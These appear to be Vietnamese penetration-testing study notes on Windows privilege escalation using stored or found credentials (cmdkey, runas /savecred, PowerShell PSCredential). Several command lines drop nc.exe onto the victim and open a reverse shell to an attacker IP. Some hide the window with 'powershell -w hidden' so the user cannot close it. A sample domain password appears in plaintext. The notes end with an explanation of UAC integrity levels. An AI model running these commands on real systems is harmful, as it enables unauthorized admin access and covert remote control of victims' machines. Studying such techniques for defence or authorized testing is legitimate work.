# Thông qua thông tin xác thực được lưu trữ

- Liệt kê các thông tin lưu trữ trong máy chủ: cmdkey /list

- Có thể thấy thông tin đăng nhập của tài khoản QTV cục bộ đã được lưu trữ trong trình quản lý thông tin xác thực và có thể được sử dụng để thự thi các lệnh
  Liệt kê các thông tin xác thực được lưu trữ bằng công cụ
- WinPEAS : .\winPEASx64.exe windowscreds

- winPEAS ko tìm thấy
- Seatbelt: .\Seatbelt.exe CredEnum

- Seatbelt đã lấy được thông tin như lệnh cmdkey /list

- Thực thi các lệnh bằng thông tin xác thực được lưu trữ

- Sau khi xác định rằng có thông tin xác thực được lưu trữ cho tài khoản quản trị viên cục bộ trên máy này, chúng tôi có thể sử dụng những thông tin xác thực đó để thực thi các lệnh bằng runas lệnh.

- NOTE: khi chạy runas nó sẽ tạo ra 1 shell khác và chạy lệnh đó nên giả sử chúng ta chạy lệnh whoami thì sẽ ko có kết quả nào được hiển thị trên shell hiện tại việc của chúng ta là phải chuyển hướng đầu ra vào 1 tệp bằng lệnh sau:

```
runas /env /noprofile /savecred /user:{TÊN} "cmd.exe /c whoami > whoami.txt"
```

- Từ đây ta có thể kiểm chứng được ta đang chạy với quyền admin ta ó thể tạo 1 shell với tư cách admin ta đẩy nc.exe sang và tạo reverse shell với tư cách ngưới dùng admin bằng câu lệnh

```
runas /env /noprofile /savecred /user:{TÊN} "c:\temp\nc.exe {ip attacker} 443 -e cmd.exe"
```

- : Điều này sẽ tạo ra 1 process cmd trên máy nạn nhân và người dùng có thể dễ dàng đóng nó nên ta có thể sử dụng thêm 1 tính năng tàn hình của powershell để thực thi 1 process ẩn.

```
runas /env /noprofile /savecred /user:{TÊN} "powershell.exe -w hidden -c c:\temp\nc.exe {ip attacker} 443 -e cmd.exe"
```

- Nâng cao đặc quyền RunAs thông qua thông tin xác thực được cung cấp

- Giả sử rằng khi chúng tôi có được chỗ đứng trên nạn nhân, chúng tôi không tìm thấy bất kỳ thông tin xác thực nào được lưu trữ bằng lệnh cmdkey /list; tuy nhiên, chúng tôi đã tìm được thông tin xác thực của người dùng khác trong một tệp ở đâu đó trên hệ thống tệp.

Có hai tình huống mà tôi có thể nghĩ ra ngay lập tức khi điều này sẽ hữu ích:

- Tìm thông tin xác thực cho một tài khoản KHÔNG có quyền truy cập vào bất kỳ dịch vụ tiêu chuẩn nào (SMB, RDP, WinRM) và do đó, không có cách nào có thể đoán trước để đăng nhập hoặc nhận shell với tư cách là người dùng này.
- Mọi trường hợp liên quan đến tài khoản đã được thêm vào nhóm quản trị viên cục bộ và cổng 3389 (RDP) đều bị đóng.

# Thực thi các lệnh bằng thông tin xác thực được cung cấp - GUI

- Từ GUI, chúng ta có thể sử dụng lệnh sau để tạo ra dấu nhắc cmd với tư cách một người dùng khác:
  runas /env /noprofile /user:juggernaut.local\cmarko cmd
  Chúng tôi được nhắc nhập mật khẩu và sau khi nhập thành công, dấu nhắc cmd sẽ mở ra với tư cách là người dùng mà chúng tôi đã chỉ định.

- Khi ta thử nhập kèm theo mật khẩu:

```
runas /env /noprofile /user:juggernaut.local\cmarko "N0cturn@l21" cmd
```

- Trang trợ giúp cho chúng tôi biết rằng chúng tôi chỉ có thể nhập mật khẩu của người dùng khi được nhắc.

# Thực thi các lệnh bằng thông tin xác thực được cung cấp – Reverse Shell (Người dùng chuẩn)

- Khi máy mục tieu đã tắt RDP(3389)
  ta bắt lại shell vằ gõ 3 lệnh sau:

```
1. $secpasswd = ConvertTo-SecureString "password" -AsPlainText -Force
2. $mycreds = New-Object System.Management.Automation.PSCredential ("TÊN", $secpasswd)
3. Start-Process -FilePath powershell.exe -argumentlist "-w hidden -c C:\temp\nc.exe {ip attacker} 443 -e cmd.exe" -Credential $mycreds
```

- Biến đầu tiên là mật khẩu (trong dấu ngoặc kép).
- Biến thứ hai là gán mật khẩu cho tên người dùng.
- Dòng thứ ba là lệnh chúng tôi muốn chạy bằng thông tin xác thực được lưu trữ.

Sau khi thực thi ta sẽ nhận được shel với tư cách người dùng

Thực thi các lệnh bằng thông tin xác thực được cung cấp – Reverse Shell (Đã thêm người dùng quản trị cục bộ)

Nếu tôi lấy được tài khoản của tài khoản nằm trong nhóm local administrator nhưng mà lại không phải là tài khoản administrator thì khi mà tôi xá thực được lưu trữ cho người dùng này thì tôi chỉ nhận được shell của người dùng chứ không phải shell của admin

Đây là kết quả của cách hoạt động của UAC. Đối với tài khoản Quản trị viên tích hợp, nếu bạn mở cmd.exe, nó sẽ mở với lời nhắc của quản trị viên theo mặc định. Tuy nhiên, nếu bạn có người dùng thuộc nhóm quản trị viên cục bộ nhưng không phải là tài khoản Quản trị viên tích hợp, để nhận được lời nhắc quản trị, bạn cần mở cmd.exe bằng “Chạy với tư cách quản trị viên”. Nếu chúng tôi chỉ mở cmd.exe với người dùng này và không chạy nó với tư cách quản trị viên, chúng tôi sẽ được cung cấp một lớp vỏ có tính toàn vẹn trung bình tiêu chuẩn.

Sau khi thực hiện các lệnh trên, chúng ta thấy rằng chúng ta đã có shell dưới dạng vcreed trên trình nghe của mình.

Tuy nhiên, khi chúng tôi kiểm tra các đặc quyền của mình bằng whoami /priv, chúng tôi sẽ thấy rằng chúng tôi đang ở trong lớp vỏ có tính toàn vẹn trung bình và KHÔNG có đặc quyền của quản trị viên .